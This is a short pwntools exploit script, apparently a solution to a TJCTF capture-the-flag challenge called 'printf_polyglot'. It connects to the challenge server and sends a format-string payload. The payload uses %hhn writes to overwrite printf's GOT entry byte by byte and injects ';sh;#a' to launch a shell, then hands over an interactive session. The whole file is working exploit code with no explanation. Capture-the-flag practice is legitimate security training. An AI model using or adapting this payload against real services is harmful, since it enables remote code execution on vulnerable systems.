from pwn import *
a= remote( host = "p1.tjctf.org", port = 8003)

# a = process('./printf_polyglot')

# raw_input('hello format string') 	
a.sendline('3')

printf_got = 0x602048

ar1 = 0x2390
ar2 = 0xa5
command = ';sh;#a'
payload =  '%' + str(0x23) + 'x%30$hhn' + '%' +str(0x90 - 0x23) +'x%29$hhn' + '%'+ str(0xa5 - 0x90) + 'x%31$hhn' +command + p64(printf_got) + p64(printf_got+1) + p64( printf_got+2 )

a.sendline(payload) 
a.sendline('y')
a.interactive()
